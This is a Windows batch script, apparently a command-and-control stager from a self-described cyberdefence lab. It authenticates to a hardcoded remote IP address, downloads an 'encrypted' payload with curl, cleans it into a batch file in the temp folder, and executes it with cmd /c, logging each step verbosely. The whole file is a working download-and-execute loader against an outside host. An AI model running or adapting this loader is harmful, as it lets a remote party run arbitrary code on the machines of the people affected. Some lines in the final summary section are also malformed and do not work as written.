@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul
title C2 VERBOSE.DEBUG.FAILSAFE - API→RAW→HEX→CLEAN→PRINT→EXEC
color 0C

echo.
echo ╔══════════════════════════════════════════════════════════════════════╗
echo ║  🕵️‍♂️  C2 VERBOSE.DEBUG.FAILSAFE - ERROR PROOF 🕵️‍♂️                      ║
echo ║  Alex Montilla - Ciberdefensa Lab vFAILSAFE                            ║
echo ╚══════════════════════════════════════════════════════════════════════╝
echo.

set "BASE=http://82.29.153.101:8080"
set "FILE=%TEMP%\sc.bat"
set "RAW=%TEMP%\sc_raw.bin"
set "CLEAN=%TEMP%\sc_clean.bat"
set "LOG=%TEMP%\c2_debug.log"
set "AUTH=%TEMP%\auth.json"

echo 📁 DEBUG FILES:
echo    AUTH: %AUTH%
echo    RAW:  %RAW%
echo    CLEAN:%CLEAN%
echo    LOG:  %LOG%
echo.

echo =====================================================
echo 🔍 [1/8] API HEALTH CHECK
echo =====================================================
echo 📡 TESTING %BASE%/health
curl -s --max-time 5 "%BASE%/health" > "%TEMP%\health.txt"
set /p HEALTH=<"%TEMP%\health.txt"
echo ✓ HEALTH: %HEALTH%
type "%TEMP%\health.txt"
del "%TEMP%\health.txt" 2>nul
echo.

echo =====================================================
echo 🔍 [2/8] API AUTH - RAW RESPONSE
echo =====================================================
echo 📡 GET %BASE%/auth/key
curl -v --max-time 10 "%BASE%/auth/key" > "%AUTH%" 2>&1
echo 📄 AUTH SIZE:
for %%F in ("%AUTH%") do echo    %%~zF bytes

if not exist "%AUTH%" (
    echo ❌ ERROR: auth.json NO CREADO
    pause
    exit /b 1
)

echo 📄 RAW AUTH JSON:
type "%AUTH%"
echo.

echo =====================================================
echo 🔍 [3/8] JSON PARSE - nonce + token
echo =====================================================
powershell -NoProfile -Command ^
  "try { $json = Get-Content '%AUTH%' -Raw | ConvertFrom-Json; ^
  $json.nonce | Out-File '%TEMP%\nonce.txt' -Encoding ASCII; ^
  $json.token | Out-File '%TEMP%\token.txt' -Encoding ASCII; ^
  Write-Host '✓ JSON PARSED OK' } ^
  catch { Write-Host '❌ JSON PARSE ERROR:' $_.Exception.Message }"

if not exist "%TEMP%\nonce.txt" (
    echo ❌ ERROR: NONCE no extraído
    pause
    exit /b 1
)

if not exist "%TEMP%\token.txt" (
    echo ❌ ERROR: TOKEN no extraído
    pause
    exit /b 1
)

set /p NONCE=<"%TEMP%\nonce.txt"
set /p TOKEN=<"%TEMP%\token.txt"
echo ✓ NONCE:  %NONCE%
echo ✓ TOKEN:  %TOKEN:~0,44%
echo.

echo =====================================================
echo 🔍 [4/8] DOWNLOAD RAW PAYLOAD - VERBOSE
echo =====================================================
echo 📡 POST %BASE%/payload/encrypted
echo 🔑 HEADERS:
echo    X-Nonce: %NONCE%
echo    X-Token: %TOKEN:~0,44%

curl -v --max-time 10 ^
  -H "X-Nonce: %NONCE%" ^
  -H "X-Token: %TOKEN%" ^
  "%BASE%/payload/encrypted" > "%RAW%" 2>&1

echo 📄 RAW SIZE:
if exist "%RAW%" (
    for %%F in ("%RAW%") do echo    %%~zF bytes
) else (
    echo ❌ ERROR: RAW file NO creado
    type "%RAW%"
    pause
    exit /b 1
)

echo 📄 CURL VERBOSE LOG:
type "%RAW%"
echo.

echo =====================================================
echo 🔍 [5/8] HEX DUMP - PRIMEROS 128 BYTES
echo =====================================================
powershell -NoProfile -Command ^
  "if(Test-Path '%RAW%') { ^
  $bytes=[System.IO.File]::ReadAllBytes('%RAW%'); ^
  Write-Host 'HEX DUMP:'; ^
  0..127 | ForEach-Object { if($_ -lt $bytes.Length) { '{0:X2} ' -f $bytes[$_] } else { '..' } } | ^
  Out-Host } else { Write-Host '❌ RAW file missing' }"

echo.

echo =====================================================
echo 🧹 [6/8] LIMPIEZA + IMPRIMIR CONTENIDO
echo =====================================================
powershell -NoProfile -Command ^
  "if(Test-Path '%RAW%') { ^
  $bytes = [System.IO.File]::ReadAllBytes('%RAW%'); ^
  $start = 0; ^
  if($bytes.Count -gt 1 -and $bytes[0] -eq 0xFF -and $bytes[1] -eq 0xFE) { $start = 2 }; ^
  if($bytes.Count -gt 2 -and $bytes[0] -eq 0xEF -and $bytes[1] -eq 0xBB -and $bytes[2] -eq 0xBF) { $start = 3 }; ^
  $cleanBytes = $bytes[$start..($bytes.Count-1)] | Where-Object { $_ -ge 32 -and $_ -le 126 }; ^
  $content = [System.Text.Encoding]::ASCII.GetString($cleanBytes); ^
  $content | Out-File '%CLEAN%' -Encoding ASCII; ^
  Write-Host ('✓ CLEAN SIZE: ' + $content.Length + ' chars'); ^
  Write-Host '📄 CONTENIDO EXTRAÍDO:'; ^
  Write-Host $content } else { Write-Host '❌ Cannot clean - RAW missing' }"

if exist "%CLEAN%" (
    echo 📄 FINAL FILE:
    type "%CLEAN%"
) else (
    echo ❌ ERROR: CLEAN file NO creado
    pause
)

echo.

echo =====================================================
echo 🚀 [7/8] EJECUCIÓN CON LOG
echo =====================================================
if exist "%CLEAN%" (
    echo 🔥 EXECUTING...
    cmd /c "%CLEAN%" > "%LOG%" 2>&1
    echo 📄 EXEC LOG:
    type "%LOG%"
) else (
    echo ❌ SKIP EXEC - no clean file
)

echo.

echo =====================================================
echo ✅ [8/8] RESUMEN FINAL
echo =====================================================
echo HEALTH: %HEALTH%
echo NONCE:  %NONCE%
echo TOKEN:  %TOKEN:~0,44%
echo RAW:    for %%F in ("%RAW%") do if exist "%%F" (echo %%~zF bytes) else (echo MISSING)
echo CLEAN:  for %%F in ("%CLEAN%") do if exist "%%F" (echo %%~zF bytes) else (echo MISSING)
echo LOG:    %LOG%
echo.

del "%TEMP%\nonce.txt" "%TEMP%\token.txt" 2>nul
pause